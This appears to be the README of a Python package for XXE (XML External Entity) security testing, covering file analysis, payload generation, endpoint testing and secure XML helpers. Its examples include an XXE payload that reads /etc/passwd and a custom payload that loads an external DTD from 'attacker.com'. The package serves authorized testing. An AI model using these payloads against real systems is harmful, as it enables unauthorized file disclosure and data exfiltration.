# XXE PyPI Package

[![PyPI version](https://badge.fury.io/py/xxe.svg)](https://badge.fury.io/py/xxe)
[![Python Versions](https://img.shields.io/pypi/pyversions/xxe.svg)](https://pypi.org/project/xxe/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

A comprehensive Python package for XML External Entity (XXE) security testing and analysis. This package provides tools for security researchers and ethical hackers to identify and analyze XXE vulnerabilities in XML processing systems.

⚠️ **IMPORTANT: This tool is for educational and authorized security testing purposes only. Only use on systems you own or have explicit permission to test.**

## Features

- 🔍 Advanced XXE vulnerability detection
- 📊 Detailed security reports and analysis
- 🛠️ Customizable payload generation
- 🧪 Automated test harness
- 🔒 Secure XML processing utilities
- 📝 Comprehensive logging and reporting

## Installation

```bash
pip install xxe
```

## Quick Start

## Command Line Interface

The XXE package includes a command line interface (CLI) for easy integration into your workflow. After installing the package, you can use the `xxe-scan` command to perform scans directly from the terminal.

### Usage

```bash
xxe-scan --help
```

This will display the help message with all available options and usage instructions.

### Example

To scan an XML file for vulnerabilities:

```bash
xxe-scan analyze-file example.xml
```

To generate a custom payload:

```bash
xxe-scan generate-payload --file-path /etc/passwd
```

To test an endpoint with a payload:

```bash
xxe-scan test-endpoint --url http://example.com/xml-endpoint --payload '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
```

```python
from xxe import XXEAnalyzer, XXETestHarness, XXEPayloads

# Basic file analysis
analyzer = XXEAnalyzer()
report = analyzer.analyze_file("example.xml")
print(f"Found {report['summary']['total_vulnerabilities']} potential vulnerabilities")

# Generate test payload
payload = XXEPayloads.generate_custom_payload(file_path="/etc/passwd")

# Run security test
harness = XXETestHarness(target_url="http://example.com/xml-endpoint")
result = harness.test_endpoint(payload)
```

## Detailed Usage

### 1. XML File Analysis

```python
from xxe import XXEAnalyzer

# Create analyzer with verbose output
analyzer = XXEAnalyzer(verbose=True)

# Analyze XML file
report = analyzer.analyze_file("target.xml")

# Print detailed results
print(f"Scan completed at: {report['scan_time']}")
print("\nVulnerabilities Summary:")
print(f"High: {report['summary']['severity_counts']['HIGH']}")
print(f"Medium: {report['summary']['severity_counts']['MEDIUM']}")
print(f"Low: {report['summary']['severity_counts']['LOW']}")

# Print detailed findings
for vuln in report['vulnerabilities']:
    print(f"\nType: {vuln['type']}")
    print(f"Severity: {vuln['severity']}")
    print(f"Description: {vuln['description']}")
```

### 2. Payload Generation and Testing

```python
from xxe import XXEPayloads, XXETestHarness

# Get built-in payloads
payloads = XXEPayloads.get_basic_payloads()

# Generate custom payload
custom_payload = XXEPayloads.generate_custom_payload(
    url="http://attacker.com/evil.dtd"
)

# Create test harness
harness = XXETestHarness(target_url="http://target.com/xml")

# Run individual test
result = harness.test_endpoint(custom_payload)
print(f"Response Code: {result['status_code']}")
print(f"Response Time: {result['response_time']}s")

# Run full test suite
results = harness.run_test_suite()
```

### 3. Secure XML Processing

```python
from xxe import create_secure_xml, validate_xml_security

# Create secure XML
content = "<data>Example content</data>"
secure_xml = create_secure_xml(content)

# Validate XML security
is_safe, validation_report = validate_xml_security("input.xml")
if not is_safe:
    print("Security issues found!")
    print(validation_report)
```

## Security Features

The package includes various security features:

- DOCTYPE declaration detection
- Entity injection analysis
- External reference checking
- Comment analysis for sensitive data
- Encoding validation
- Comprehensive vulnerability reporting

## Best Practices

1. Always obtain proper authorization before testing
2. Document all testing activities
3. Follow responsible disclosure practices
4. Use secure configurations in production
5. Keep the package updated to the latest version

## Logging

The package uses Python's built-in logging module. To configure logging:

```python
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
```

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.


## Support

- Documentation: [https://xxe.readthedocs.io/](https://xxe.readthedocs.io/)
- Issue Tracker: [https://github.com/ishanoshada/xxe/issues](https://github.com/ishanoshada/xxe/issues)
- Security Issues: Please report security issues directly to security@yourdomain.com

## Disclaimer

This tool is for educational and authorized testing purposes only. Users are responsible for obtaining appropriate permissions before testing any systems. The authors are not responsible for misuse or damages caused by this tool.

## Authors

- Your Name ([@ishanoshada](https://github.com/ishanoshada))

## Acknowledgments

- Security researchers and ethical hackers who contributed to XXE research
- The Python security community
- All contributors to this project